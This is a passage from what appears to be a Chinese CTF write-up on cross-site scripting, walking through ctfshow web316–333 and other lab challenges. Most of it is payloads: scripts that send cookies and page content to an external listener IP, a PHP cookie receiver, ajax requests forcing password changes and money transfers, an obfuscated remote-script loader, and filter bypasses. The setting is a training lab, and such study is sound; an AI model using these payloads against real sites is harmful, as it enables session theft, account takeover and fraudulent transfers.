</span></span><span class=line><span class=cl><span class=n>GET</span> <span class=o>/</span><span class=n>PHPSESSID</span><span class=o>=</span><span class=n>o360pf41voksjv2f8ur1tm7o1n</span><span class=p>;</span><span class=o>%</span><span class=mi>20</span><span class=n>flag</span><span class=o>=</span><span class=n>ctfshow</span><span class=o>%</span><span class=mi>7</span><span class=n>B8f2ded97</span><span class=o>-</span><span class=n>e98b</span><span class=o>-</span><span class=mi>4</span><span class=n>a2e</span><span class=o>-</span><span class=n>b771</span><span class=o>-</span><span class=mi>358</span><span class=n>d90420962</span><span class=o>%</span><span class=mi>7</span><span class=n>D</span> <span class=n>HTTP</span><span class=o>/</span><span class=mf>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=p>:</span> <span class=n>text</span><span class=o>/</span><span class=n>html</span><span class=p>,</span><span class=n>application</span><span class=o>/</span><span class=n>xhtml</span><span class=o>+</span><span class=n>xml</span><span class=p>,</span><span class=n>application</span><span class=o>/</span><span class=n>xml</span><span class=p>;</span><span class=n>q</span><span class=o>=</span><span class=mf>0.9</span><span class=p>,</span><span class=o>*/*</span><span class=p>;</span><span class=n>q</span><span class=o>=</span><span class=mf>0.8</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=p>:</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>127.0</span><span class=o>.</span><span class=mf>0.1</span><span class=o>/</span><span class=n>target</span><span class=o>.</span><span class=n>php</span><span class=err>?</span><span class=n>key</span><span class=o>=</span><span class=n>ctfshow_bot_key</span>
</span></span><span class=line><span class=cl><span class=n>User</span><span class=o>-</span><span class=n>Agent</span><span class=p>:</span> <span class=n>Mozilla</span><span class=o>/</span><span class=mf>5.0</span> <span class=p>(</span><span class=n>Unknown</span><span class=p>;</span> <span class=n>Linux</span> <span class=n>x86_64</span><span class=p>)</span> <span class=n>AppleWebKit</span><span class=o>/</span><span class=mf>538.1</span> <span class=p>(</span><span class=n>KHTML</span><span class=p>,</span> <span class=n>like</span> <span class=n>Gecko</span><span class=p>)</span> <span class=n>PhantomJS</span><span class=o>/</span><span class=mf>2.1</span><span class=o>.</span><span class=mi>1</span> <span class=n>Safari</span><span class=o>/</span><span class=mf>538.1</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=p>:</span> <span class=n>Keep</span><span class=o>-</span><span class=n>Alive</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>-</span><span class=n>Encoding</span><span class=p>:</span> <span class=n>gzip</span><span class=p>,</span> <span class=n>deflate</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>-</span><span class=n>Language</span><span class=p>:</span> <span class=n>en</span><span class=p>,</span><span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=p>:</span> <span class=n>ip</span><span class=p>:</span><span class=mi>9999</span>
</span></span></code></pre></td></tr></table></div></div><p>写一个文件进行接收</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$a</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>    <span class=nx>file_put_contents</span><span class=p>(</span><span class=s1>&#39;cookie.txt&#39;</span><span class=p>,</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;nonono!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>别忘记给权限不然写不了文件的</p><p>payload也要改改</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>&lt;</span><span class=n>body</span> <span class=n>onload</span><span class=o>=</span><span class=s2>&#34;window.open(&#39;http://ip/xss.php?a=&#39;+document.cookie)&#34;</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>当然后面别忘记修改权限避免安全问题</p><h3 id=反射>反射</h3><p><img src=/p/xss-in-depth/QQ20240925-143818.png width=988 height=386 loading=lazy alt=2></p><p>所以说恶意代码是存在 URL 里</p><p>demo <strong>ctfshow web316&ndash;web326</strong>，可以看到我们插入的恶意代码都会直接在<code>url</code>之中</p><p>随便搞一个<strong>326</strong>来测试</p><p>过滤了空格和一些标签写出<code>payload</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>&lt;</span><span class=n>body</span><span class=o>/**/</span><span class=n>onload</span><span class=o>=</span><span class=s2>&#34;window.open(&#39;http://ip:port/&#39;+document.cookie)&#34;</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>这里发现貌似是写文件不能够行的了诶，没关系监听端口也可以</p><h3 id=存储>存储</h3><p><img src=/p/xss-in-depth/QQ20240925-143913.png width=1008 height=612 loading=lazy alt=3></p><p>嗯哼，恶意代码存在数据库里，也就是我们常见的登录框、留言框等等场景</p><p><strong>留言框demo ctfshow web327</strong></p><p>在留言框里面留下恶意代码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>&lt;</span><span class=n>body</span><span class=o>/**/</span><span class=n>onload</span><span class=o>=</span><span class=s2>&#34;window.open(&#39;http://27.25.151.48:9999/&#39;+document.cookie)&#34;</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>oh shit有一个小坑就是只能发送给<code>admin</code>，但是想来能有权限解析恶意代码的也只有<code>admin</code>了</p><p><strong>登录框demo ctfshow web328</strong></p><p>在注册框里面插入恶意代码，然后登录，即可成功(原理也是一样)，这里是把一些标签过滤了我们换一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;script&gt;window.open(&#39;http://27.25.151.48:9999/&#39;+document.cookie)&lt;/script&gt;
</span></span></code></pre></td></tr></table></div></div><p>拿到<code>cookie</code>之后登录即可</p><p><strong>ctfshow web329</strong>当cookie在一直更换无法使用cookie登录时，我们可以试试查找关键字或者锁定位置来进行</p><p>通过<strong>检查</strong>得到位置之后，发现也只有两个位置(也就是这两列)，不过元素索引这个事情大家都知道吧，所以写一个payload来获取到元素内容</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=nb>window</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=s1>&#39;http://27.25.151.48:9999/&#39;</span><span class=o>+</span><span class=nb>document</span><span class=p>.</span><span class=nx>getElementsByClassName</span><span class=p>(</span><span class=s1>&#39;layui-table-cell laytable-cell-1-0-1&#39;</span><span class=p>)[</span><span class=mi>1</span><span class=p>].</span><span class=nx>innerHTML</span><span class=p>)&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>也可以进行循环捕捉</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=nx>$</span><span class=p>(</span><span class=s1>&#39;.layui-table-cell.laytable-cell-1-0-1&#39;</span><span class=p>).</span><span class=nx>each</span><span class=p>(</span><span class=kd>function</span><span class=p>(</span><span class=nx>index</span><span class=p>,</span><span class=nx>value</span><span class=p>){</span><span class=k>if</span><span class=p>(</span><span class=nx>value</span><span class=p>.</span><span class=nx>innerHTML</span><span class=p>.</span><span class=nx>indexOf</span><span class=p>(</span><span class=s1>&#39;ctf&#39;</span><span class=o>+</span><span class=s1>&#39;show{&#39;</span><span class=p>)</span><span class=o>&gt;-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nb>window</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>href</span><span class=o>=</span><span class=s1>&#39;http://27.25.151.48:2333/&#39;</span><span class=o>+</span><span class=nx>value</span><span class=p>.</span><span class=nx>innerHTML</span><span class=p>;}});&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>这些函数自个查查(<del>我也不熟悉</del>)</p><p>还有利用<code>xss</code>打一个本地类似的<code>ssrf</code></p><p><strong>demo ctfshow web330</strong></p><p>抓包先</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /api/change.php?p=123 HTTP/1.1
</span></span><span class=line><span class=cl>Host: 55f6799f-809c-4233-a4a2-3c5c9031145b.challenge.ctf.show
</span></span><span class=line><span class=cl>Cookie: PHPSESSID=erm5q643d7svu4r7l4m9fh3ctd
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Platform: &#34;Windows&#34;
</span></span><span class=line><span class=cl>X-Requested-With: XMLHttpRequest
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: */*
</span></span><span class=line><span class=cl>Sec-Ch-Ua: &#34;Google Chrome&#34;;v=&#34;129&#34;, &#34;Not=A?Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;129&#34;
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Mobile: ?0
</span></span><span class=line><span class=cl>Sec-Fetch-Site: same-origin
</span></span><span class=line><span class=cl>Sec-Fetch-Mode: cors
</span></span><span class=line><span class=cl>Sec-Fetch-Dest: empty
</span></span><span class=line><span class=cl>Referer: https://55f6799f-809c-4233-a4a2-3c5c9031145b.challenge.ctf.show/change.php
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Priority: u=1, i
</span></span><span class=line><span class=cl>Connection: close
</span></span></code></pre></td></tr></table></div></div><p>那么可以构造payload来试试能否更改</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=nx>location</span><span class=p>.</span><span class=nx>href</span><span class=o>=</span><span class=s1>&#39;http://127.0.0.1/api/change.php?p=123456&#39;</span><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>然后<code>admin</code>登录即可</p><p>或者和web329差不多直接打出整个页面的内容(但是肯定不一样)</p><p>根据F12我们慢慢试试可以看到<code>layui-container</code>就直接覆盖了那个页面的所有内容，我们直接获取所有源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=nx>location</span><span class=p>.</span><span class=nx>href</span><span class=o>=</span><span class=s2>&#34;http://27.25.151.48:2333/&#34;</span><span class=o>+</span><span class=nb>document</span><span class=p>.</span><span class=nx>getElementsByClassName</span><span class=p>(</span><span class=s1>&#39;layui-container&#39;</span><span class=p>)[</span><span class=mi>0</span><span class=p>].</span><span class=nx>outerHTML</span><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>然后解码就行了</p><p><strong>web331</strong></p><p>当然还是可以直接获取页面的整个内容，不过修改密码也是一个不错的选择这次发现是<code>POST</code>传参</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=nx>$</span><span class=p>.</span><span class=nx>ajax</span><span class=p>({</span><span class=nx>url</span><span class=o>:</span><span class=s1>&#39;api/change.php&#39;</span><span class=p>,</span><span class=nx>type</span><span class=o>:</span><span class=s1>&#39;post&#39;</span><span class=p>,</span><span class=nx>data</span><span class=o>:</span><span class=p>{</span><span class=nx>p</span><span class=o>:</span><span class=mi>123</span><span class=p>}});&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>不使用<code>jquery</code>也可以使用<code>js</code>来写</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=kd>var</span> <span class=nx>httpRequest</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>XMLHttpRequest</span><span class=p>();</span><span class=nx>httpRequest</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=s1>&#39;POST&#39;</span><span class=p>,</span> <span class=s1>&#39;http://127.0.0.1/api/change.php&#39;</span><span class=p>,</span> <span class=kc>true</span><span class=p>);</span><span class=nx>httpRequest</span><span class=p>.</span><span class=nx>setRequestHeader</span><span class=p>(</span><span class=s2>&#34;Content-type&#34;</span><span class=p>,</span><span class=s2>&#34;application/x-www-form-urlencoded&#34;</span><span class=p>);</span><span class=nx>httpRequest</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=s1>&#39;p=123456&#39;</span><span class=p>);&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=dom>DOM</h3><p>为什么被称为是<code>DOM</code>型呢，因为在其中</p><blockquote><ol><li>使用document.write直接输出数据。</li><li>使用innerHTML直接输出数据。</li><li>使用location、location.href、location.replace、iframe.src、document.referer、window.name等这些。</li></ol></blockquote><p>可以看到这些我们在前面都是已经看到过的，也就是直接利用<code>xss</code>进行文档操作的都可以算作是<code>DOM</code>型,demo的话上面都有写，所以这个的利用就得多多了解一些函数了，并且与前两者不同的东西</p><blockquote><p>DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p></blockquote><p>所以这里就不放demo了</p><h3 id=异步xss>异步xss</h3><blockquote><ul><li><strong>异步通信</strong>：现代 Web 应用程序广泛使用 AJAX（Asynchronous JavaScript and XML）技术，通过异步请求与服务器通信，更新页面内容而无需重新加载整个页面。</li><li><strong>异步 XSS</strong>：利用 AJAX 请求中的漏洞，注入恶意脚本，这些脚本在用户浏览器中异步执行。</li></ul></blockquote><p>说实话看懂了吗，我反正是没看懂，不过倒是有个demo就是<strong>ctfshow web333</strong></p><p>这里仍然是转钱的漏洞不过，我们可以利用异步xss，进行转钱，可以越过转钱金额的限制</p><p>抓包了好几次拿到交易的包</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /api/amount.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: 4ac4a559-3aaa-4967-ad5d-dd6885415e45.challenge.ctf.show
</span></span><span class=line><span class=cl>Cookie: PHPSESSID=uomr637qbom070ab78u7t149l2
</span></span><span class=line><span class=cl>Content-Length: 9
</span></span><span class=line><span class=cl>Cache-Control: max-age=0
</span></span><span class=line><span class=cl>Sec-Ch-Ua: &#34;Google Chrome&#34;;v=&#34;129&#34;, &#34;Not=A?Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;129&#34;
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Mobile: ?0
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Platform: &#34;Windows&#34;
</span></span><span class=line><span class=cl>Origin: https://4ac4a559-3aaa-4967-ad5d-dd6885415e45.challenge.ctf.show
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class=line><span class=cl>Sec-Fetch-Site: same-origin
</span></span><span class=line><span class=cl>Sec-Fetch-Mode: navigate
</span></span><span class=line><span class=cl>Sec-Fetch-User: ?1
</span></span><span class=line><span class=cl>Sec-Fetch-Dest: document
</span></span><span class=line><span class=cl>Referer: https://4ac4a559-3aaa-4967-ad5d-dd6885415e45.challenge.ctf.show/transfer.php
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Priority: u=0, i
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>u=111&amp;a=1
</span></span></code></pre></td></tr></table></div></div><p>我们用<code>xss</code>进行POST传参转钱</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=nx>$</span><span class=p>.</span><span class=nx>ajax</span><span class=p>({</span><span class=nx>url</span><span class=o>:</span><span class=s1>&#39;api/amount.php&#39;</span><span class=p>,</span><span class=nx>type</span><span class=o>:</span><span class=s1>&#39;post&#39;</span><span class=p>,</span><span class=nx>data</span><span class=o>:</span><span class=p>{</span><span class=nx>u</span><span class=o>:</span><span class=s1>&#39;111&#39;</span><span class=p>,</span><span class=nx>a</span><span class=o>:</span><span class=s1>&#39;10000&#39;</span><span class=p>}});&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>也许这样子看来和普通的xss有啥不同啊，没啥不同啊，但是本身我们会发现每次转钱之后会说交易成功，然后我们自己回去那个页面查看金额，这种就是<strong>属于更新</strong>而没有重新加载页面，如果是<strong>重新加载</strong>的话应该是<strong>转钱之后当即刷新</strong></p><h2 id=demo我觉得可以做做>demo(我觉得可以做做)</h2><h3 id=buu-xss-course-1>BUU XSS COURSE 1</h3><p>进来一个框子直接开打</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>IMG</span> <span class=na>SRC</span><span class=o>=</span><span class=s>&#34;javascript.:alert(&#39;XSS&#39;);&#34;</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>得到路径</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl> /#/view/7f1d432a-6ec5-42c6-b460-6e514a4d43e1
</span></span></code></pre></td></tr></table></div></div><p>访问之后发现一张图片，但是访问不了，不过内容确实是我们成功插入的payload，那么可能说靶机不能访问外网，那么修改一下<code>payload</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>&lt;/</span><span class=n>textarea</span><span class=o>&gt;</span><span class=s1>&#39;&#34;&gt;&lt;img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement</span><span class=si>%28%</span><span class=s1>22script</span><span class=si>%22%</span><span class=s1>29%3Bb.src%3D%22http%3A</span><span class=si>%2F%2F</span><span class=s1>xss.buuoj.cn</span><span class=si>%2F</span><span class=s1>8sVXk7</span><span class=si>%22%</span><span class=s1>3B</span><span class=si>%28d</span><span class=s1>ocument.getElementsByTagName</span><span class=si>%28%</span><span class=s1>22HEAD</span><span class=si>%22%</span><span class=s1>29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b</span><span class=si>%29%</span><span class=s1>3B/.source));//&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>这是<code>xssplatform</code>来写出的<code>payload</code>,但是现在平台用不了了QWQ</p><h3 id=第二章-web进阶xss闯关>[第二章 web进阶]XSS闯关</h3><p>进来可以看到我们的代码是直接插入源码的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=nx>alert</span><span class=p>(</span><span class=mi>1</span><span class=p>)&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>第二关闭合即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#39;;alert(1);//
</span></span></code></pre></td></tr></table></div></div><p>第三关被转义了一个单引号，但是无所谓，再加一个即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#39;&#39;;alert(1);//
</span></span></code></pre></td></tr></table></div></div><p>第四关查看源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>function</span> <span class=nx>jump</span><span class=p>(</span><span class=nx>time</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    		<span class=k>if</span><span class=p>(</span><span class=nx>time</span> <span class=o>==</span> <span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    			<span class=nx>location</span><span class=p>.</span><span class=nx>href</span> <span class=o>=</span> <span class=nx>jumpUrl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    		<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    			<span class=nx>time</span> <span class=o>=</span> <span class=nx>time</span> <span class=o>-</span> <span class=mi>1</span> <span class=p>;</span>
</span></span><span class=line><span class=cl>    			<span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;ccc&#39;</span><span class=p>).</span><span class=nx>innerHTML</span><span class=o>=</span> <span class=sb>`页面</span><span class=si>${</span><span class=nx>time</span><span class=si>}</span><span class=sb>秒后将会重定向到</span><span class=si>${</span><span class=nx>escape</span><span class=p>(</span><span class=nx>jumpUrl</span><span class=p>)</span><span class=si>}</span><span class=sb>`</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    			<span class=nx>setTimeout</span><span class=p>(</span><span class=nx>jump</span><span class=p>,</span><span class=mi>1000</span><span class=p>,</span><span class=nx>time</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    		<span class=p>}</span>
</span></span><span class=line><span class=cl>    	<span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>那么我们可以利用属性插入</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?jumpUrl=javascript:alert(1)
</span></span></code></pre></td></tr></table></div></div><p>第五关查看源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>getQueryVariable</span><span class=p>(</span><span class=s1>&#39;autosubmit&#39;</span><span class=p>)</span> <span class=o>!==</span> <span class=kc>false</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    		<span class=kd>var</span> <span class=nx>autoForm</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;autoForm&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    		<span class=nx>autoForm</span><span class=p>.</span><span class=nx>action</span> <span class=o>=</span> <span class=p>(</span><span class=nx>getQueryVariable</span><span class=p>(</span><span class=s1>&#39;action&#39;</span><span class=p>)</span> <span class=o>==</span> <span class=kc>false</span><span class=p>)</span> <span class=o>?</span> <span class=nx>location</span><span class=p>.</span><span class=nx>href</span> <span class=o>:</span> <span class=nx>getQueryVariable</span><span class=p>(</span><span class=s1>&#39;action&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    		<span class=nx>autoForm</span><span class=p>.</span><span class=nx>submit</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    		
</span></span><span class=line><span class=cl>    	<span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>两个参数，然后我们需要搞点事情，绕过一点小检查</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?autosubmit=1&amp;action=javascript:alert(1)
</span></span></code></pre></td></tr></table></div></div><p>第六关</p><p>AngularJS 1.4.6框架，沙箱逃逸</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
